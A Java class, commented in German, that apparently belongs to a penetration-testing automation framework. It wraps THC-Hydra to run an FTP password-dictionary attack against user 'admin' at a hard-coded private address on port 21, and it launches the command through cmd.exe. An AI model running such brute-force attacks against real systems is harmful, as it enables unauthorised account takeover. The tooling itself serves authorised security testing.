package de.schuetzmarvin.casphydramod;

import de.schuetzmarvin.caspconvertermod.*;
import de.schuetzmarvin.caspprovidermod.IProvider;
import de.schuetzmarvin.caspprovidermod.ProviderHydra;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

    // Hydra Klasse mit run-Methoden zur Durchführung eines Wörterbuchangriffs mit übergebenen Parametern durch den Nutzer oder mittels Informationen vorheriger Tools.
public class Hydra implements IHydra{
    // Initialisierung eines Provider Objekts über das IProvider Interface
    IProvider provider;

    // Initialisierung eines Converter Objekts über das IConverter Interface
    IConverter converter;

    // Konstruktor für die Erstellung einer Hydra Instanz + Deklaration von Provider und Converter
    public Hydra(){
        this.provider = new ProviderHydra();
        this.converter  = new ConverterAdapterHydra();
    }




    /*
        Die run-Methode, welche genutzt wird, wenn Hydra verwendet wird, ohne das der Nutzer Parameter übergeben hat. In dieser wird die Output-Datei erstellt,
        sofern diese noch nicht vorhanden ist, der Befehl für Hydra auf Grundlage von informationen vorheriger Tools zusamengebaut und die Ausführung des Tools Hydra
        mit dem entsprechenden Befehl über die Kommandozeile ausgeführt. Abschließend wird das toXmlfile-Methode des Converters die Output-Datei zur Übersetzung in XMl übergeben.
     */
    public boolean run() throws IOException, InterruptedException, TransformerException, SAXException, ParserConfigurationException {
        if(!new File("CASPStorage\\tool_outputs\\hydra_output.json").exists()){
            new File("CASPStorage\\tool_outputs\\hydra_output.json").createNewFile();
        }
        Thread.sleep(10000);
        String port="";
        String ip_address ="";
        ArrayList<ArrayList<String>> information_about_ip_and_port = provider.getParametersforExecutionmultipleValues();
        ArrayList<String> ip = information_about_ip_and_port.get(0);
        ArrayList<String> p = information_about_ip_and_port.get(1);
        for (String value:ip) {
            if(value.equals("192.168.1.2")){
                ip_address = value;
            }
        }
        for (String value:p) {
            if(value.equals("21")){
                port = value;
            }
        }
        String hydra_command = "hydra -o " + this.provider.getFilePath(new File("CASPStorage\\tool_outputs\\hydra_output.json")) + " -b json -s " + port + " -l admin -P " + this.provider.getFilePath(new File("CASPStorage\\documents\\dictionary.txt")) + " " + ip_address + " ftp";
        String command_exec_cmd =  "cmd.exe /c cd  C:\\Program Files (x86)\\thc-hydra-windows-master\\ & start cmd.exe /k " + hydra_command;
        Runtime.getRuntime().exec(command_exec_cmd);
        Thread.sleep(20000);
        this.converter.toXmlfile(this.provider.getFilePath(new File("CASPStorage\\tool_outputs\\hydra_output.json")));
        return true;
    }



        /*
           Die run-Methode, welche genutzt wird, wenn Hydra verwendet wird und der Nutzer Parameter übergeben hat. In dieser wird die Output-Datei erstellt,
           sofern diese noch nicht vorhanden ist, der Befehl für Hydra auf Grundlage von informationen vorheriger Tools zusamengebaut und die Ausführung des Tools Hydra
           mit dem entsprechenden Befehl über die Kommandozeile ausgeführt. Abschließend wird das toXmlfile-Methode des Converters die Output-Datei zur Übersetzung in XMl übergeben.
        */
    public boolean run(String tool_parameters) throws InterruptedException, IOException, TransformerException, SAXException, ParserConfigurationException {
        if(!new File("CASPStorage\\tool_outputs\\hydra_output.json").exists()){
            new File("CASPStorage\\tool_outputs\\hydra_output.json").createNewFile();
        }
        Thread.sleep(10000);
        String port="";
        String username="";
        String dictionary ="";
        String ip_address="";
        List<String> parameters = new ArrayList<String>(Arrays.asList(tool_parameters.split(" ")));
        for (String value : parameters) {
            if(value.equals("dictionary.txt")){
                dictionary = value;
            }
            if(value.equals("admin")){
                username = value;
            }
            if(value.equals("21")){
                port = value;
            }
            if(value.equals("192.168.1.2")){
                ip_address = value;
            }
        }
        String hydra_command = "hydra -o " + this.provider.getFilePath(new File("CASPStorage\\tool_outputs\\hydra_output.json")) + " -b json -s " + port + " -l " + username + " -P " + this.provider.getFilePath(new File("documents\\"+dictionary)) + " " + ip_address + " ftp";
        String command_exec_cmd =  "cmd.exe /c cd  C:\\Program Files (x86)\\thc-hydra-windows-master\\ & start cmd.exe /k " + hydra_command;
        Runtime.getRuntime().exec(command_exec_cmd);
        Thread.sleep(20000);
        this.converter.toXmlfile(this.provider.getFilePath(new File("CASPStorage\\tool_outputs\\hydra_output.json")));
        return true;
    }



    // gibt den Provider des Hydra-Objekts zurück
    public IProvider getProvider(){
        return this.provider;
    }


    /*
        Die Methode gibt true oder false zurück.
        true --> Tool kann konfiguriert werden, weil es Parameter entgegennimmt
        false --> Tool kann nicht konfiguriert werden, weil es keine Parameter entgegennimmt
     */
    public boolean checkIFconfiguration() {
        if(this.getProvider().getNeededValuesManual().isEmpty()){
            return false;
        }

        return true;
    }
}
